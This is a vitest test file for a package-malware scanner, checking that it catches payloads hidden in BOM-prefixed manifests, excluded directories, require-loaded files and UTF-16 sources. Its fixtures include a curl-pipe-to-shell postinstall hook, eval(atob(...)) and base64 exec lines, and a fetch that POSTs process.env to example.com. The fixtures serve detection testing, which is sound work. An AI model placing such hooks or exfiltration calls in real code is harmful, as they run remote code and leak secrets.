/**
 * Content the scanner never read or never parsed while reporting a clean
 * result (security review 2026-10-07, F4, F7, F8, F10, F20, F23). Every case
 * goes through scan() on a temp-dir fixture.
 */
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

vi.mock("../ioc-blocklist.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../ioc-blocklist.js")>();
  return { ...actual, checkFileDigest: vi.fn(actual.checkFileDigest) };
});

import { scan } from "../scanner.js";
import { scanExtractedFiles } from "../pypi-scanner.js";
import { checkFileDigest } from "../ioc-blocklist.js";
import type { Finding, ScanReport } from "../types.js";

// A payload the scanner flags critical in any scannable file.
// Built from parts so this test file does not trip the repository self-scan
// (critical rules now fire in test paths too).
const PAYLOAD = ["ev", 'al(at', 'ob("ZG9jdW1lbnQud3JpdGUoMSk="));\n'].join("");
const CURL_SH = "curl https://example.com/x.sh | sh";

// The first scan() of a file loads the threat feed, which exceeds the default 5 s.
vi.setConfig({ testTimeout: 60_000 });

let dir: string;

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-coverage-gaps-"));
});

afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

function write(rel: string, content: string | Buffer): void {
  const target = path.join(dir, rel);
  fs.mkdirSync(path.dirname(target), { recursive: true });
  fs.writeFileSync(target, content);
}

async function run(): Promise<ScanReport> {
  return scan({ target: dir, format: "json", noHistory: true });
}

const critical = (report: ScanReport): Finding[] =>
  report.findings.filter((f) => f.severity === "critical");
const rules = (report: ScanReport): string[] => report.findings.map((f) => f.rule);
const manifest = (extra: Record<string, unknown>): string =>
  JSON.stringify({ name: "fixture", version: "1.0.0", ...extra });

describe("F4: package.json the parser cannot read", () => {
  it("still flags the install hook when package.json starts with a BOM", async () => {
    write("package.json", "\uFEFF" + manifest({ scripts: { postinstall: CURL_SH } }));
    const report = await run();
    expect(critical(report).length).toBeGreaterThan(0);
    expect(rules(report)).toContain("INSTALL_HOOK_DOWNLOAD_EXEC");
  });

  it("control: the same manifest without a BOM is flagged the same way", async () => {
    write("package.json", manifest({ scripts: { postinstall: CURL_SH } }));
    const report = await run();
    expect(rules(report)).toContain("INSTALL_HOOK_DOWNLOAD_EXEC");
  });

  it("reports a root package.json that is not JSON as a partial scan, not clean", async () => {
    write("package.json", manifest({ scripts: { postinstall: CURL_SH } }) + "}");
    const report = await run();
    expect(report.partialScan).toBe(true);
    const gap = report.findings.find((f) => f.match === "unparseable package.json");
    expect(gap?.rule).toBe("PATH_SCAN_INCOMPLETE");
  });

  it("control: a valid manifest is not reported as unparseable", async () => {
    write("package.json", manifest({ scripts: { build: "tsc" } }));
    const report = await run();
    expect(report.findings.some((f) => f.match === "unparseable package.json")).toBe(false);
  });
});

describe("F7: excluded directories", () => {
  it("control: an unreferenced node_modules stays out of the scan, quietly", async () => {
    write("package.json", manifest({}));
    write("node_modules/x/index.js", PAYLOAD);
    const report = await run();
    expect(critical(report)).toHaveLength(0);
    expect(report.partialScan).toBeFalsy();
  });

  it("walks a node_modules path an install hook points into", async () => {
    write("package.json", manifest({ scripts: { postinstall: "node node_modules/x/index.js" } }));
    write("node_modules/x/index.js", PAYLOAD);
    write("node_modules/y/index.js", PAYLOAD);
    const report = await run();
    const files = critical(report).map((f) => f.file);
    expect(files).toContain("node_modules/x/index.js");
    // Only what is referenced: the rest of node_modules is not walked.
    expect(files).not.toContain("node_modules/y/index.js");
  });

  it("walks a bundled dependency and its install hook", async () => {
    write("package.json", manifest({ bundleDependencies: ["inner"] }));
    write(
      "node_modules/inner/package.json",
      manifest({ name: "inner", scripts: { postinstall: CURL_SH } }),
    );
    const report = await run();
    expect(critical(report).some((f) => f.file === "node_modules/inner/package.json")).toBe(true);
  });

  it("walks the run-time dependencies of a bundled dependency", async () => {
    write("package.json", manifest({ bundleDependencies: ["inner"] }));
    write("node_modules/inner/package.json", manifest({ name: "inner", dependencies: { deep: "1.0.0" } }));
    write("node_modules/deep/index.js", PAYLOAD);
    const report = await run();
    expect(critical(report).some((f) => f.file === "node_modules/deep/index.js")).toBe(true);
  });

  it("names a __pycache__ that holds source and marks the scan partial", async () => {
    write("package.json", manifest({}));
    write("__pycache__/a.js", PAYLOAD);
    const report = await run();
    expect(report.partialScan).toBe(true);
    const gap = report.findings.find((f) => f.rule === "PATH_SCAN_INCOMPLETE" && f.file === "__pycache__");
    expect(gap).toBeDefined();
  });

  it("names a venv that holds source without failing the scan as partial", async () => {
    write("package.json", manifest({}));
    write("venv/lib/a.py", "print('hi')\n");
    const report = await run();
    const note = report.findings.find((f) => f.rule === "EXCLUDED_DIRECTORY_SKIPPED");
    expect(note?.file).toBe("venv");
    expect(report.partialScan).toBeFalsy();
  });

  it("walks a venv an install hook points into", async () => {
    write("package.json", manifest({ scripts: { postinstall: "venv/bin/run.sh" } }));
    write("venv/bin/run.sh", PAYLOAD);
    const report = await run();
    expect(critical(report).some((f) => f.file === "venv/bin/run.sh")).toBe(true);
  });

  it("stays quiet about the scanner's own state directories", async () => {
    write("package.json", manifest({}));
    write(".scg-history/state.json", "{}");
    const report = await run();
    expect(rules(report)).not.toContain("EXCLUDED_DIRECTORY_SKIPPED");
    expect(report.partialScan).toBeFalsy();
  });

  it("scans a PyPI archive's venv/ and __pycache__/ content", () => {
    write("pkg/venv/a.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n");
    const findings: Finding[] = [];
    const result = scanExtractedFiles(dir, findings);
    expect(result.filesScanned).toBe(1);
    expect(findings.some((f) => f.severity === "critical")).toBe(true);
  });
});

describe("F8: files the scanner did not read", () => {
  it("follows require() to a .txt file and scans it as JavaScript", async () => {
    write("package.json", manifest({}));
    write("l.js", 'require("./a.txt");\n');
    write("a.txt", PAYLOAD);
    const report = await run();
    expect(critical(report).some((f) => f.file === "a.txt")).toBe(true);
  });

  it("follows import() and an extensionless target", async () => {
    write("package.json", manifest({}));
    write("l.mjs", 'await import("./lib/blob");\n');
    write("lib/blob", PAYLOAD);
    const report = await run();
    expect(critical(report).some((f) => f.file === "lib/blob")).toBe(true);
  });

  it("control: a .txt nothing loads is not read as code", async () => {
    write("package.json", manifest({}));
    write("l.js", "console.log(1);\n");
    write("a.txt", PAYLOAD);
    const report = await run();
    expect(critical(report)).toHaveLength(0);
  });

  it("does not follow a require out of the scan root", async () => {
    write("package.json", manifest({}));
    write("l.js", 'require("../outside.txt");\n');
    const outside = path.join(path.dirname(dir), "outside.txt");
    fs.writeFileSync(outside, PAYLOAD);
    try {
      const report = await run();
      expect(critical(report)).toHaveLength(0);
    } finally {
      fs.rmSync(outside, { force: true });
    }
  });

  it.each([".vbs", ".hta", ".wsf", ".html", ".htm", ".jse", ".vbe"])(
    "reads %s content",
    async (ext) => {
      write("package.json", manifest({}));
      write(`a${ext}`, PAYLOAD);
      const report = await run();
      expect(critical(report).some((f) => f.file === `a${ext}`)).toBe(true);
    },
  );

  it("control: an ordinary HTML page with scripts, assets and local paths stays clean", async () => {
    write("package.json", manifest({}));
    const png = Buffer.alloc(3000, 7).toString("base64");
    write(
      "docs/index.html",
      `<!doctype html><html><head><title>Docs</title>
<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
<script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);}</script>
<style>.logo{background:url(data:image/png;base64,${png})}</style></head>
<body><p>Generated from C:\\Users\\dev\\project</p><a href="https://github.com/org/repo">repo</a></body></html>`,
    );
    const report = await run();
    expect(report.findings.filter((f) => f.severity !== "info")).toHaveLength(0);
  });

  it("scans a .pth file in a PyPI archive", () => {
    write("pkg/evil.pth", "import base64; exec(base64.b64decode('cHJpbnQoMSk='))\n");
    const findings: Finding[] = [];
    const result = scanExtractedFiles(dir, findings);
    expect(result.filesScanned).toBe(1);
    expect(findings.some((f) => f.severity === "critical" || f.severity === "high")).toBe(true);
  });
});

describe("F10: UTF-16 source", () => {
  const exfil =
    'fetch("https://example.com/c", { method: "POST", body: JSON.stringify(process.env) });\n';

  it("control: the payload is detected as UTF-8", async () => {
    write("a.ps1", exfil);
    expect(rules(await run())).toContain("ENV_EXFILTRATION");
  });

  it("detects it in UTF-16LE with a BOM", async () => {
    write("a.ps1", Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(exfil, "utf16le")]));
    expect(rules(await run())).toContain("ENV_EXFILTRATION");
  });

  it("detects it in UTF-16LE without a BOM", async () => {
    write("a.ps1", Buffer.from(exfil, "utf16le"));
    expect(rules(await run())).toContain("ENV_EXFILTRATION");
  });

  it("detects it in UTF-16BE", async () => {
    const be = Buffer.from(exfil, "utf16le");
    be.swap16();
    write("a.ps1", Buffer.concat([Buffer.from([0xfe, 0xff]), be]));
    expect(rules(await run())).toContain("ENV_EXFILTRATION");
  });

  it("control: a UTF-8 file with a stray NUL byte is still read as UTF-8", async () => {
    write("a.ps1", Buffer.concat([Buffer.from(exfil), Buffer.from([0])]));
    expect(rules(await run())).toContain("ENV_EXFILTRATION");
  });
});

describe("F20: digest check for files no content rule reads", () => {
  const digestCalls = (): string[] =>
    vi.mocked(checkFileDigest).mock.calls.map((call) => call[1] as string);

  beforeEach(() => {
    vi.mocked(checkFileDigest).mockClear();
  });

  it("hashes a 6 MB file with an unscanned extension", async () => {
    write("package.json", manifest({}));
    write("payload.dat", Buffer.alloc(6_000_000, 1));
    const report = await run();
    expect(digestCalls()).toContain("payload.dat");
    expect(rules(report)).not.toContain("FILE_TOO_LARGE_SKIPPED");
  });

  // Past the cap: reported, but informational and not partial, because a
  // large media asset is ordinary in a repository.
  it("records a file past the hashing cap without marking the scan partial", async () => {
    write("package.json", manifest({}));
    const big = path.join(dir, "huge.dat");
    fs.writeFileSync(big, "");
    fs.truncateSync(big, 70 * 1024 * 1024);
    const report = await run();
    expect(digestCalls()).not.toContain("huge.dat");
    const skip = report.findings.find((f) => f.rule === "LARGE_FILE_NOT_HASHED");
    expect(skip?.file).toBe("huge.dat");
    expect(skip?.severity).toBe("info");
    expect(report.partialScan).toBeUndefined();
  });
});

describe("F23: manifests the root pulls in from test-like directories", () => {
  const hook = { scripts: { postinstall: CURL_SH } };

  it("checks a workspace member under test/", async () => {
    write("package.json", manifest({ workspaces: ["test/p"] }));
    write("test/p/package.json", manifest({ name: "p", ...hook }));
    const report = await run();
    expect(critical(report).some((f) => f.file === "test/p/package.json")).toBe(true);
  });

  it("checks a workspace matched by a glob", async () => {
    write("package.json", manifest({ workspaces: { packages: ["fixtures/*"] } }));
    write("fixtures/p/package.json", manifest({ name: "p", ...hook }));
    const report = await run();
    expect(critical(report).some((f) => f.file === "fixtures/p/package.json")).toBe(true);
  });

  it("checks a file: dependency under fixtures/", async () => {
    write("package.json", manifest({ dependencies: { inner: "file:fixtures/p" } }));
    write("fixtures/p/package.json", manifest({ name: "p", ...hook }));
    const report = await run();
    expect(critical(report).some((f) => f.file === "fixtures/p/package.json")).toBe(true);
  });

  it("control: an unreferenced fixture manifest is still skipped", async () => {
    write("package.json", manifest({}));
    write("test/q/package.json", manifest({ name: "q", ...hook }));
    const report = await run();
    expect(critical(report)).toHaveLength(0);
  });
});
